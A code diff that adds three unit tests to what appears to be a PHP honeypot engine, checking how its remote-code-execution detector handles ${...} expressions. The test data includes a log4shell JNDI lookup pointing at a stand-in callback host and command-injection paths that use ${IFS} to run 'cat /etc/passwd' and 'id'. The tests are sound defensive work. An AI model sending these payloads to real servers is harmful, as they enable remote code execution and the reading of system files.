@@ -94,6 +94,48 @@ final class CrsRceDollarExprFalsePositiveTest extends TestCase
         }
     }
 
+    public function test_long_dollar_expression_does_not_leak_root(): void
+    {
+        // A ${...} longer than any fixed strip bound — real log4shell OOB payloads (nested lookups + a long
+        // callback host) routinely run past a few hundred chars. The strip must be length-unbounded, else the
+        // catch-all still serves uid=0 for the exact payload class this filter targets.
+        $longHost = str_repeat('a', 260);
+        $benignLong = '/${' . str_repeat('x', 260) . '}';
+        $jndiLong = '/${jndi:ldap://' . $longHost . '.oast.example/exploit}';
+
+        self::assertStringNotContainsString('uid=0', $this->body($this->respond($benignLong)), 'long benign ${…}');
+        self::assertStringNotContainsString('uid=0', $this->body($this->respond('/x', 'p=' . $benignLong)), 'long benign ${…} in query');
+
+        $r = $this->respond($jndiLong);
+        self::assertStringNotContainsString('uid=0', $this->body($r), 'long log4shell lookup must not serve root');
+        self::assertNotSame('attack-crs-rce', $this->servedBy($r));
+        // Still detected for intel despite the length.
+        $v = $this->engine()->classify(new RequestContext('GET', $jndiLong, '', [], null, 'x.test'), SiteProfile::empty());
+        $ids = array_map(static function ($m) { return is_object($m) ? ($m->id ?? $m->name ?? '') : (string) ($m['id'] ?? ''); }, $v->detection->matches);
+        self::assertContains('log4shell-jndi', $ids, 'long log4shell still detected');
+    }
+
+    public function test_ifs_obfuscated_genuine_injection_still_confirms(): void
+    {
+        // The false-negative guard: a genuine ${IFS}-obfuscated command carries a real metacharacter, so the
+        // higher-priority hand-authored cmdi/lfi tier owns it BEFORE the crs-rce catch-all (and thus before
+        // the strip runs at all). Stripping ${IFS} must never turn a real injection into a clean 404.
+        foreach (['/x;cat${IFS}/etc/passwd', '/x;${IFS}id'] as $path) {
+            $r = $this->respond($path);
+            self::assertNotNull($r, $path);
+            self::assertNotNull($this->servedBy($r), "{$path} must still be served an attack decoy, not 404");
+        }
+    }
+
+    public function test_dollar_expr_in_body_and_header_surfaces_is_also_filtered(): void
+    {
+        // The strip covers rawBody and header values, not just path/query.
+        $body = $this->engine()->respond(new RequestContext('POST', '/x', '', [], 'v=${benign}', 'x.test'), SiteProfile::empty(), 's');
+        self::assertStringNotContainsString('uid=0', $body !== null ? (string) $body->body : '', 'body ${benign}');
+        $hdr = $this->engine()->respond(new RequestContext('GET', '/x', '', ['X-Probe' => '${benign}'], null, 'x.test'), SiteProfile::empty(), 's');
+        self::assertStringNotContainsString('uid=0', $hdr !== null ? (string) $hdr->body : '', 'header ${benign}');
+    }
+
     public function test_dollar_expr_adjacent_to_a_real_command_substitution_still_confirms(): void
     {
         // A benign ${x} next to a real $(id): stripping ${x} leaves $(id), so the match is not suppressed.
